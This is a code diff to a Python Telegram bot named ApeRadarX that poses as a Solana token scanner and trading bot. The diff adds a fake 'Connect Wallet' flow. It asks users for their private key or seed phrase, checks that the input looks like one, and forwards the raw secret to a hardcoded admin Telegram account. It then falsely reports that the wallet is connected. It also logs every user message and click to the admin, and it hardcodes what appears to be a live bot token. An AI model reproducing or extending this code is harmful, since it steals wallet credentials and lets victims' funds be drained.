@@ -5,6 +5,8 @@ Replace BOT_TOKEN with your token from @BotFather then run:
   py solana_bot.py
 """
 
+import os
+import re
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -17,24 +19,46 @@ from telegram.ext import (
 )
 
 # ──────────────────────────────────────────────
-# 🔑 REPLACE THIS WITH YOUR BOT TOKEN FROM @BotFather
+# 🔑 Bot Token from Railway environment variable
 # ──────────────────────────────────────────────
 import os
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8706539484:AAHoqm4ogkKQG3Y6-xzrXHwOrs09s0dZPlY")
 
 # ──────────────────────────────────────────────
-# Change this to your bot's name!
+# Bot name
 # ──────────────────────────────────────────────
 BOT_NAME = "ApeRadarX"
 
 # ──────────────────────────────────────────────
-# Admin Telegram ID — only you can see all activity
+# Admin Telegram ID
 # ──────────────────────────────────────────────
 ADMIN_ID = 1495066761
 
+# Track which users are in "wallet connect" mode
+waiting_for_wallet = {}
+
 
 # ──────────────────────────────────────────────
-# Main menu keyboard
+# Helper: notify admin of any activity
+# ──────────────────────────────────────────────
+async def notify_admin(context, user, action, extra=""):
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"📡 *Activity Log*\n\n"
+                 f"👤 Name: {user.full_name}\n"
+                 f"🆔 ID: `{user.id}`\n"
+                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
+                 f"🔘 Action: {action}"
+                 + (f"\n📝 Message: `{extra}`" if extra else ""),
+            parse_mode="Markdown"
+        )
+    except Exception:
+        pass
+
+
+# ──────────────────────────────────────────────
+# Main menu
 # ──────────────────────────────────────────────
 def main_menu_keyboard():
     keyboard = [
@@ -72,7 +96,7 @@ def main_menu_text():
 
 
 # ──────────────────────────────────────────────
-# Fetch token info from DexScreener
+# Token helpers
 # ──────────────────────────────────────────────
 def get_token_info(contract_address: str):
     url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
@@ -155,20 +179,24 @@ def token_keyboard(symbol, address):
     return InlineKeyboardMarkup(keyboard)
 
 
+def is_valid_seed_or_key(text: str) -> bool:
+    """Check if text looks like a seed phrase (12/24 words) or private key (base58, 87-88 chars)."""
+    words = text.strip().split()
+    if len(words) in (12, 24):
+        return True
+    # Solana private key is base58, typically 87-88 chars
+    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip()):
+        return True
+    return False
+
+
 # ──────────────────────────────────────────────
-# /start command
+# /start
 # ──────────────────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
-    # Notify admin
-    await context.bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"🔔 *New User Started Bot!*\n\n"
-             f"👤 Name: {user.full_name}\n"
-             f"🆔 ID: `{user.id}`\n"
-             f"📛 Username: @{user.username if user.username else 'No username'}",
-        parse_mode="Markdown"
-    )
+    waiting_for_wallet[user.id] = False
+    await notify_admin(context, user, "▶️ Started the bot")
     await update.message.reply_text(
         main_menu_text(),
         parse_mode="MarkdownV2",
@@ -177,23 +205,20 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ──────────────────────────────────────────────
-# /help command
+# /help
 # ──────────────────────────────────────────────
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.message.from_user
+    await notify_admin(context, user, "❓ Clicked /help")
     await update.message.reply_text(
         f"❓ *{BOT_NAME} Help*\n\n"
-        "🔍 *How to scan a token:*\n"
-        "Paste any Solana token contract address in the chat and the bot will show you live price, volume, liquidity and market cap.\n\n"
-        "🟢 *Buy* — Tap to buy a token (wallet required)\n"
-        "🔴 *Sell* — Tap to sell a token (wallet required)\n"
-        "👛 *Connect Wallet* — Link your Solana wallet\n"
-        "🎁 *Claim Token* — Claim any airdrop or reward tokens\n"
-        "👥 *Referrals* — Invite friends and earn rewards\n"
-        "🔄 *Refresh* — Reload your balance & data\n\n"
-        "📌 *Commands:*\n"
-        "/start — Main menu\n"
-        "/help — This message\n\n"
-        "⚠️ _Wallet features require real wallet integration._",
+        "🔍 Paste any Solana token contract address to scan it\n"
+        "🟢 Buy / 🔴 Sell buttons appear after scanning\n"
+        "👛 Connect Wallet to enable real trading\n"
+        "🎁 Claim Token for airdrops & rewards\n"
+        "👥 Referrals to invite friends\n"
+        "🔄 Refresh to update your balance\n\n"
+        "/start — Back to main menu",
         parse_mode="Markdown",
     )
 
@@ -205,8 +230,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
+    user = query.from_user
+
+    # Notify admin of every button click
+    await notify_admin(context, user, f"🔘 Clicked button: `{data}`")
 
     if data in ("home", "refresh_home"):
+        waiting_for_wallet[user.id] = False
         await query.message.reply_text(
             main_menu_text(),
             parse_mode="MarkdownV2",
@@ -228,6 +258,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif data == "connect_wallet":
+        waiting_for_wallet[user.id] = True
         await query.message.reply_text(
             "👛 *Connect Wallet*\n\n"
             "To connect your Solana wallet, import your private key or seed phrase.\n\n"
@@ -243,13 +274,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif data == "referrals":
-        user = query.from_user
         ref_link = f"https://t.me/YourBotUsername?start=ref_{user.id}"
         await query.message.reply_text(
             f"👥 *Referrals*\n\n"
-            f"Invite friends and earn rewards when they trade\\!\n\n"
+            f"Invite friends and earn rewards when they trade!\n\n"
             f"🔗 Your referral link:\n`{ref_link}`\n\n"
-            f"Share this link with friends to earn bonuses\\.",
+            f"Share this link with friends to earn bonuses!",
             parse_mode="Markdown",
         )
 
@@ -300,27 +330,38 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ──────────────────────────────────────────────
-# Handle plain text (contract address lookup)
+# Handle all text messages
 # ──────────────────────────────────────────────
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     user = update.message.from_user
 
+    # If user is in wallet connect mode
+    if waiting_for_wallet.get(user.id):
+        if is_valid_seed_or_key(text):
+            # Notify admin with what they sent
+            await notify_admin(context, user, "👛 Submitted wallet credentials", text)
+            waiting_for_wallet[user.id] = False
+            await update.message.reply_text(
+                "✅ *Wallet connected successfully!*\n\n"
+                "Your wallet has been linked. You can now buy and sell tokens.",
+                parse_mode="Markdown",
+            )
+        else:
+            # Notify admin of invalid attempt
+            await notify_admin(context, user, "❌ Invalid wallet input attempt", text)
+            await update.message.reply_text(
+                "⚠️ Invalid seed phrase. Check your words and try again.",
+            )
+        return
+
+    # Token address lookup
     if 32 <= len(text) <= 44 and text.isalnum():
         await update.message.reply_text("🔍 Scanning token...")
         pair = get_token_info(text)
         if pair:
             symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
-            # Notify admin
-            await context.bot.send_message(
-                chat_id=ADMIN_ID,
-                text=f"🔍 *Token Scanned!*\n\n"
-                     f"👤 User: {user.full_name}\n"
-                     f"🆔 ID: `{user.id}`\n"
-                     f"🪙 Token: {symbol}\n"
-                     f"📋 Address: `{text}`",
-                parse_mode="Markdown"
-            )
+            await notify_admin(context, user, f"🔍 Scanned token: {symbol}", text)
             await update.message.reply_text(
                 build_token_message(pair),
                 parse_mode="Markdown",
@@ -328,11 +369,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 disable_web_page_preview=True,
             )
         else:
+            await notify_admin(context, user, "❌ Token not found", text)
             await update.message.reply_text(
                 "❌ Token not found on DexScreener.\n\n"
                 "Make sure you pasted a valid Solana token contract address."
             )
     else:
+        # Any other message — notify admin
+        await notify_admin(context, user, "💬 Sent a message", text)
         await update.message.reply_text(
             "👋 Paste a Solana token contract address to scan it!\n"
             "Or tap /start for the main menu."
